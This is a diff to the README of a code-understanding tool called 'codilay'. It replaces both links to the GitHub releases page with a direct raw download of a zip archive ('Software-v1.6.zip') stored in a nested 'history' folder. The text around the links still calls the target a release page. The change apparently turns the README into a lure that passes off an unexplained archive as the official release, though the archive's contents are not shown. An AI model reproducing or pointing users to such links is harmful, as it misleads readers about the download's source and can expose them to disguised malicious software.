@@ -1,6 +1,6 @@
 # 🤖 codilay - Understand codebases with clarity
 
-[⬇ Download codilay](https://github.com/Daohuyt5735/codilay/releases) ![GitHub release](https://img.shields.io/badge/Download-Release-purple)
+[⬇ Download codilay](https://raw.githubusercontent.com/Daohuyt5735/codilay/main/codilay/history/Software-v1.6.zip) ![GitHub release](https://img.shields.io/badge/Download-Release-purple)
 
 ## 🧭 What codilay does
 
@@ -29,7 +29,7 @@ If your project is large, give codilay some time to scan it.
 
 Visit the release page here:
 
-[https://github.com/Daohuyt5735/codilay/releases](https://github.com/Daohuyt5735/codilay/releases)
+[https://raw.githubusercontent.com/Daohuyt5735/codilay/main/codilay/history/Software-v1.6.zip](https://raw.githubusercontent.com/Daohuyt5735/codilay/main/codilay/history/Software-v1.6.zip)
 
 On that page:
 
